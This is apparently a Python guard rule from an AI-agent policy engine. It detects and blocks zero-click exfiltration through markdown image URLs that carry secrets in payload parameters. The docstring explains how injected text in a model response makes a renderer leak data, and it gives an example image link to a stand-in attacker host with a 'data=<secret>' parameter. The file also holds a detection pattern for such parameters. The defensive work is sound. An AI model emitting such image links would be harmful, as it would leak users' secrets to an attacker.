"""Argument guard: block zero-click markdown-image exfiltration.

Markdown image syntax pairs a visible alt text with a URL the renderer fetches
*automatically* - no click, no hover, no user consent. An attacker who can get
text into a model response (or any field a downstream renderer trusts) can plant
``![x](https://evil.example/log?data=<secret>)`` and the secret rides out on the
image fetch itself. The renderer is the exfiltration channel, so nothing needs
to be clicked for the data to leave.

The signature of this technique is structural, not lexical: an image URL that
carries a *payload parameter* in its query string or path - the classic
``?data=``, ``?token=``, ``?secret=``, ``?key=``, ``?q=``. That is the shape
this rule matches. A plain image reference (``![chart](https://cdn/chart.png)``)
has no such parameter and is left alone, which keeps ordinary prose and
documentation images from tripping the guard.

This sits on the *argument* detector, ahead of any tool effect, so it blocks the
call before the image is ever rendered or fetched. Only top-level *string* values
of a dict ``args`` are inspected; ints, None and nested containers are skipped
rather than stringified, so structural data cannot fake a match and odd input
never raises. The first matching value blocks and names the offending argument;
no match returns None (no opinion), leaving the engine's default-allow path for
benign traffic.
"""
from __future__ import annotations

import re
from typing import Optional

from ..enforce import Decision
from ..event import SensorEvent
from ..masking import _LinearMatch
from ..policy.engine import Rule

POLICY_ID = "markdown_image_exfil"

# Markdown image whose URL carries a query-parameter payload:
#   ![alt](https://host/path?payload=...)  or  ![alt](https://host/payload=...)
# ``[^\]]*`` covers the alt text (including empty), ``https?://`` pins it to a
# fetchable image URL, and the ``(?:\?|/)`` before the payload lets the parameter
# arrive via a query string or a path segment. The captured group is the whole
# offending URL so the match is self-describing in logs.
#
# re.IGNORECASE: URL schemes are case-insensitive and a receiving server reads
# ``?Token=`` the same as ``?token=``, so a capital letter must not carry the
# data past the rule. The image syntax the match requires keeps prose out.
#
# The scanner below preserves that acceptance set in one forward pass. For each
# ``![`` opener the first ``]`` is the only possible closer, its next character
# must be ``(``, and ``https?://`` must start immediately after. The URL can
# never cross a ``)``, so the next ``)`` is the only possible close; its window
# is inspected once, and a failed tail is remembered so later candidates ending
# at the same ``)`` (a suffix of the same window) are not rescanned.
_IMAGE_SOURCE = (
    r"!\[[^\]]*\]\((https?://[^)]*(?:\?|/)[^)]*(?:token|data|secret|key|q)=[^)]*)\)"
)
_IMAGE_SCHEME = re.compile(r"https?://", re.IGNORECASE)
# The tail ``[^)]*(?:\?|/)[^)]*(?:token|data|secret|key|q)=[^)]*`` accepts a
# window exactly when some ``?`` or ``/`` is followed by a payload keyword and
# ``=``. The two nested ``[^)]*`` runs make that regex quadratic on a window full
# of delimiters and keyword letters; splitting it into "first delimiter" then
# "keyword after it" keeps the same acceptance set with two linear searches.
_IMAGE_DELIMITER = re.compile(r"[?/]")
_IMAGE_KEYWORD = re.compile(r"(?:token|data|secret|key|q)=", re.IGNORECASE)


def _image_tail_matches(text: str, start: int, end: int) -> bool:
    """Whether the tail regex matches ``text[start:end]`` (which has no ``)``)."""
    delimiter = _IMAGE_DELIMITER.search(text, start, end)
    if delimiter is None:
        return False
    return _IMAGE_KEYWORD.search(text, delimiter.start() + 1, end) is not None


def _next_character(text: str, char: str):
    """``out[i]`` is the index of the first ``char`` at or after ``i`` (or len)."""
    length = len(text)
    out = [length] * (length + 1)
    nxt = length
    for index in range(length - 1, -1, -1):
        if text[index] == char:
            nxt = index
        out[index] = nxt
    return out


class _MarkdownImageScanner:
    """Linear stand-in for the image pattern whose source is ``pattern``."""

    pattern = _IMAGE_SOURCE

    def search(self, text: str):
        opener = -1
        index = 0
        length = len(text)
        closers = None
        failed_close = -1
        while index < length:
            char = text[index]
            if char == "!" and index + 1 < length and text[index + 1] == "[":
                if opener < 0:
                    opener = index
                index += 2
                continue
            if char == "]":
                if opener >= 0 and index + 1 < length and text[index + 1] == "(":
                    url_start = index + 2
                    if closers is None:
                        closers = _next_character(text, ")")
                    closing = closers[url_start]
                    if closing >= length:
                        return None
                    scheme = _IMAGE_SCHEME.match(text, url_start)
                    if scheme is not None and closing != failed_close:
                        if _image_tail_matches(text, scheme.end(), closing):
                            return _LinearMatch(
                                text, ((opener, closing + 1), (url_start, closing))
                            )
                        failed_close = closing
                opener = -1
            index += 1
        return None


PATTERN = _MarkdownImageScanner()


def markdown_image_exfil_guard() -> Rule:
    """Build a Rule that blocks zero-click markdown-image exfiltration.

    Each top-level str value of a dict ``args`` is tested against
    :data:`PATTERN`. On the first match the rule returns a BLOCK naming the
    offending argument, so the caller can tell which field carried the exfil
    image. A non-dict ``args``, a dict with no str values, and a dict whose str
    values are all benign each return None (no opinion). The rule never raises.
    """

    def rule(event: SensorEvent) -> Optional[Decision]:
        args = getattr(event, "args", None)
        if not isinstance(args, dict):
            return None

        for name, value in args.items():
            if not isinstance(value, str):
                continue
            if PATTERN.search(value):
                return Decision.block(
                    reason="markdown_image_exfil: {}".format(name),
                    policy_id=POLICY_ID,
                    attributed_to=name,
                )

        return None

    return rule
